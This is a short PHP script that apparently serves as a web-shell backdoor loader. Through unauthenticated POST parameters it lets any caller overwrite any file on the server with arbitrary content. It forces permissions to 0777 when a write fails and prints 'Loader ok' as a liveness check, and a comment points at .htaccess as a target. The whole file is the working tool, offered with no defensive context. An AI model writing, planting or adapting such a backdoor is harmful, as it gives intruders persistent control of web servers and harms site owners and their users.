<?php

//htaccess !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


//print_r($_POST);

if(isset($_POST['update']))
{               $file = $_POST['file'];


	$content=stripslashes(urldecode($_POST['text']));

	if (!is_writable($file)) chmod($file, 0755);

	$fpn=fopen($file,"w"); 
	if(fputs($fpn,$content))
		{echo "<h1><font color=green>successful_update</font></h1><br>";}
	else

		{	echo "<h1><font color=red>error_no_wrighting_rights</font></h1><br>";

			fclose($fpn);
			if (!is_writable($file)) chmod($file, 0777);
			$fpn=fopen($file,"w"); 

			if (fputs($fpn,$content)) 
				{ echo "<h1><font color=green>successful_update</font> on 2 step</h1><br>";}
				else 
				{ echo "<h1><font color=red>error_no_wrighting_rights</font> on 2 step</h1><br>";}	
		
		}
	fclose($fpn);
	chmod($file, 0755);



} else { echo "Loader ok"; }


?>